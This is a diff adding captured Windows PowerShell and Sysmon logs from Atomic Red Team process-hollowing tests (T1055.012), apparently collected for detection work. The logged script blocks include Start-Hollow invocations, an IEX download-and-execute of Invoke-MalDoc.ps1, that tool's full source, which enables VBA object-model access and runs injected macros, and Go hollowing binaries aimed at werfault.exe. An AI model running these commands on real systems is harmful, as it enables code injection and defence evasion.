@@ -1,0 +1,375 @@
+Atomic Test #1 - Process Hollowing using PowerShell
+
+Log1
+10/02/2024 10:44:16 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2712
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+
+ScriptBlock ID: a478c78a-11b6-44ab-92af-8b4265c29738
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 10:44:16 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2710
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+$ppid=Get-Process explorer | select -expand id
+
+ScriptBlock ID: cbc61b9f-f576-4b99-aa91-36fa83444f83
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #2 - RunPE via VBA
+
+Log1
+10/02/2024 10:44:54 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2722
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Invoke-MalDoc -macroFile "E:\T1055.012-macrocode.txt" -officeProduct "Word" -sub "Exploit"
+
+ScriptBlock ID: 1ee1e75a-3164-47b9-be6f-2e9368fd6f30
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 10:44:54 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=2720
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+function Invoke-MalDoc {
+    <#
+    .SYNOPSIS
+    A module to programatically execute Microsoft Word and Excel Documents containing macros.
+
+    .DESCRIPTION
+    A module to programatically execute Microsoft Word and Excel Documents containing macros. The module will temporarily add a registry key to allow PowerShell to interact with VBA.
+    .PARAMETER macroCode
+    [Required] The VBA code to be executed. By default, this macro code will be wrapped in a sub routine, called "Test" by default. If you don't want your macro code to be wrapped in a subroutine use the `-noWrap` flag. To specify the subroutine name use the `-sub` parameter.
+    .PARAMETER macroFile
+    [Required] A file containing the VBA code to be executed. To specify the subroutine name to be called use the `-sub` parameter.
+    .PARAMETER officeVersion
+    [Optional] The Microsoft Office version to use for executing the document. e.g. "16.0". The version will be determined Programmatically if not specified.
+    .PARAMETER officeProduct
+    [Required] The Microsoft Office application in which to create and execute the macro, either "Word" or "Excel".
+    .PARAMETER sub
+    [Optional] The name of the subroutine in the macro code to call for execution. Also the name of the subroutine to wrap the supplied `macroCode` in if `noWrap` is not specified.
+    .PARAMETER noWrap
+    [Optional] A switch that specifies that the supplied `macroCode` should be used as-is and not wrapped in a subroutine.
+    
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroCode "MsgBox `"Hello`"" -officeProduct "Word"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macro code `MsgBox "Hello"` will be wrapped inside of a subroutine call "Test" and then executed.
+    
+    .EXAMPLE
+    C:\PS> $macroCode = Get-Content path/to/macro.txt -Raw
+    C:\PS> Invoke-Maldoc -macroCode $macroCode -officeProduct "Word"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macro code read from `path/to/macro.txt` will be wrapped inside of a subroutine call "Test" and then executed.
+    
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroCode "MsgBox `"Hello`"" -officeProduct "Excel" -sub "DoIt"
+    -----------
+    Create a macro enabled Microsoft Excel Document. The macro code `MsgBox "Hello"` will be wrapped inside of a subroutine call "DoIt" and then executed.
+
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroCode "Sub Exec()`nMsgBox `"Hello`"`nEnd Sub" -officeProduct "Word" -noWrap -sub "Exec"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macroCode will be unmodified (i.e. not wrapped insided a subroutine) and the "Exec" subroutine will be executed.
+
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroFile "C:\AtomicRedTeam\atomics\T1003\src\macro.txt" -officeProduct "Word" -sub "DoIt"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macroCode will be read from the specified file and the "DoIt" subroutine will be executed.
+
+#>
+
+    Param(
+        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "code")]
+        [String]$macroCode,
+
+        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "file")]
+        [String]$macroFile,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]$officeVersion,
+
+        [Parameter(Position = 2, Mandatory = $True)]
+        [ValidateSet("Word", "Excel")]
+        [String]$officeProduct,
+
+        [Parameter(Position = 3, Mandatory = $false)]
+        [String]$sub = "Test",
+
+        [Parameter(Position = 4, Mandatory = $false, ParameterSetName = "code")]
+        [switch]$noWrap
+    )
+
+    $app = New-Object -ComObject "$officeProduct.Application"
+    if (-not $officeVersion) { $officeVersion = $app.Version } 
+    $Key = "HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\"
+    if (-not (Test-Path $key)) { New-Item $Key }
+    Set-ItemProperty -Path $Key -Name 'AccessVBOM' -Value 1
+
+    if ($macroFile) {
+        $macroCode = Get-Content $macroFile -Raw
+    }
+    elseif (-not $noWrap) {
+        $macroCode = "Sub $sub()`n" + $macroCode + "`nEnd Sub"
+    }
+
+    if ($officeProduct -eq "Word") {
+        $doc = $app.Documents.Add()
+    }
+    else {
+        $doc = $app.Workbooks.Add()
+    }
+    $comp = $doc.VBProject.VBComponents.Add(1)
+    $comp.CodeModule.AddFromString($macroCode)
+    $app.Run($sub)
+    $doc.Close(0)
+    $app.Quit()
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comp) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app) | Out-Null
+    [System.GC]::Collect()
+    [System.GC]::WaitForPendingFinalizers()
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\" -Name 'AccessVBOM' -ErrorAction Ignore
+}
+
+ScriptBlock ID: deaf3bd3-4cae-4959-b8b6-cf027e43528f
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log3
+10/02/2024 10:44:53 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2719
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+
+ScriptBlock ID: bbaf21c5-3b65-40a7-a57d-d11978895f72
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log4
+10/02/2024 10:44:53 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2717
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+ScriptBlock ID: 603a1ae0-928b-473c-ad09-59dcb2aa0526
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+
+Atomic Test #3 - Process Hollowing in Go using CreateProcessW WinAPI
+
+Log1
+09/03/2024 06:34:11 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=279629
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-02 22:34:11.404
+ProcessGuid: {6f6dba56-3d63-66d6-5671-2a0000001700}
+ProcessId: 107448
+Image: E:\Download\CreateProcess.exe
+FileVersion: -
+Description: -
+Product: -
+Company: -
+OriginalFileName: -
+CommandLine: "E:\Download\CreateProcess.exe" -program C:\Windows\System32\werfault.exe -debug
+CurrentDirectory: E:\Download\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=129BA20A22F573576B5F208F68F3E917C3E4C2EE,MD5=38C326844D3DAEC69CE059D225B50243,SHA256=0527815730C76A7FBF5F109199E24F1215E59275581861D3EE904A5A6ECF1B65,IMPHASH=4F2F006E2ECF7172AD368F8289DC96C1
+ParentProcessGuid: {6f6dba56-35e9-66d6-d863-2a0000001700}
+ParentProcessId: 2364
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+折叠
+host = DESKTOP-43B3OH1source = E:\Download\15ttp_logs_2\T1055.012\T1055_012.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Log2
+10/02/2024 10:46:11 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2724
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+E:\CreateProcess.exe -program "C:\Windows\System32\werfault.exe" -debug
+
+ScriptBlock ID: 0be741c2-b497-4e85-9b47-b0f33feb059b
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #4 - Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs
+
+Log1
+09/03/2024 06:35:40 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=291375
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-02 22:35:40.845
+ProcessGuid: {6f6dba56-3dbc-66d6-0d72-2a0000001700}
+ProcessId: 105276
+Image: E:\Download\CreateProcessWithPipe.exe
+FileVersion: -
+Description: -
+Product: -
+Company: -
+OriginalFileName: -
+CommandLine: "E:\Download\CreateProcessWithPipe.exe" -program C:\Windows\System32\werfault.exe -debug
+CurrentDirectory: E:\Download\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=C18903E4600E451CD655008BBD212BB43008105D,MD5=A6956DDA985B7423635F75CF52986771,SHA256=6B21770B42B2071BDB72043FDA50BF94B70011D9CFC8BA1696EA979360610B69,IMPHASH=4F2F006E2ECF7172AD368F8289DC96C1
+ParentProcessGuid: {6f6dba56-35e9-66d6-d863-2a0000001700}
+ParentProcessId: 2364
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+折叠
+host = DESKTOP-43B3OH1source = E:\Download\15ttp_logs_2\T1055.012\T1055_012.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Log2
+10/02/2024 10:46:36 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2726
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+E:\CreateProcessWithPipe.exe -program "C:\Windows\System32\werfault.exe" -debug
+
+ScriptBlock ID: 5a71e18a-b1b5-4e05-8bc1-4755f89ce9fe
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1055.012\T1055_012_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
